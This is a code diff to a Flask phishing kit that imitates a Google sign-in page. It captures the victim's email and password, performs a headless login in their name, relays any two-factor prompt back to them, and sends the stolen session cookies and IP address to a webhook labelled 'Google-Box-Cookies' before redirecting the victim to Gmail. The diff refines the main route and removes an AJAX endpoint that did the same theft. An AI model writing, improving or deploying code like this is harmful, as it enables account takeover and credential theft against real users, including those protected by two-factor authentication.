@@ -221,7 +221,6 @@ def enter_password():
     error = None
     branding = None
     password_val = None
-    show_loading = False
 
     if email:
         branding = get_google_email_details(email)
@@ -266,21 +265,7 @@ def enter_password():
         session['authenticated'] = True
         session['password'] = password_val
 
-        # First render: show password page again with loading indicator
-        show_loading = False
-        return render_template(
-            'password.html',
-            email=email,
-            banner=session.get('banner'),
-            background=session.get('background'),
-            error=error,
-            loading=show_loading
-        )
-
-    # Second render: after user re-submits password, process headless login
-    if request.method == 'GET' and session.get('authenticated') and session.get('password'):
-        email = session.get('email')
-        password_val = session.get('password')
+        # Attempt headless login immediately after password submission
         login_result = handle_headless_login(email, password_val)
 
         if login_result is not None and login_result.get('success'):
@@ -289,66 +274,42 @@ def enter_password():
             file_content = f"{email}\n{cookies_json}"
             cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {request.headers.get('X-Forwarded-For', request.remote_addr)}\n\n```json\n{cookies_json}\n```"
             send_webhook_message(cookie_webhook_message)
-            with open(COOKIE_TEMP_FILE, 'w') as f:
-                f.write(file_content)
+            try:
+                with open(COOKIE_TEMP_FILE, 'w') as f:
+                    f.write(file_content)
+            except Exception as e:
+                print(f"[ERROR] Failed to write cookies file: {str(e)}")
             session.clear()
             return redirect('https://mail.google.com/inbox/')
         elif login_result is not None and login_result.get('2fa_required'):
+            # 2FA required, render the 2FA page HTML for user to complete authentication
             twofa_html = login_result.get('2fa_html', '')
             return Response(twofa_html, mimetype='text/html')
-        else:
-            error = 'Invalid password or login failed.'
+        elif login_result is not None and login_result.get('error') == 'invalid_password':
+            error = 'Invalid password. Please try again.'
             session['authenticated'] = False
             session['password'] = None
             return render_template(
-                'password.html',
-                email=email,
-                banner=session.get('banner'),
-                background=session.get('background'),
-                error=error,
-                loading=False
+            'password.html',
+            email=email,
+            banner=session.get('banner'),
+            background=session.get('background'),
+            error=error,
+            loading=False
+            )
+        else:
+            error = 'Login failed. Please try again later.'
+            session['authenticated'] = False
+            session['password'] = None
+            return render_template(
+            'password.html',
+            email=email,
+            banner=session.get('banner'),
+            background=session.get('background'),
+            error=error,
+            loading=False
             )
 
-    # Default render: show password page
-    return render_template(
-        'password.html',
-        email=email,
-        banner=session.get('banner'),
-        background=session.get('background'),
-        error=error,
-        loading=False
-    )
-
-@app.route('/ajax-headless-login', methods=['GET', 'POST'])
-def ajax_headless_login():
-    if not session.get('authenticated'):
-        return jsonify({'success': False, 'error': 'Not authenticated'}), 403
-    email = session.get('email')
-    password = session.get('password')
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-
-    login_result = handle_headless_login(email, password)
-    if login_result is not None and login_result.get('success'):
-        cookies_json = json.dumps(cookies_to_json(login_result.get('cookies', [])), indent=2)
-        file_content = f"{email}\n{cookies_json}"
-        cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {client_ip}\n\n```json\n{cookies_json}\n```"
-        send_webhook_message(cookie_webhook_message)
-        with open(COOKIE_TEMP_FILE, 'w') as f:
-            f.write(file_content)
-        session.clear()
-        # Redirect user to Gmail inbox after successful login
-        return jsonify({'success': True, 'cookies_json': cookies_json, 'redirect_url': 'https://mail.google.com/'})
-    elif login_result is not None and login_result.get('2fa_required'):
-        # Render the 2FA page HTML for user to complete authentication in browser
-        twofa_html = login_result.get('2fa_html', '')
-        return jsonify({'success': False, '2fa_required': True, '2fa_html': twofa_html})
-    else:
-        if login_result is not None and login_result.get('error') == 'invalid_password':
-            session['authenticated'] = False
-            return jsonify({'success': False, 'error': 'Invalid password'})
-        send_webhook_message(f"⚠️ Headless login FAILED for {email}. No cookies captured.")
-        session.clear()
-        return jsonify({'success': False})
 
 def handle_headless_login(email, password):
     """
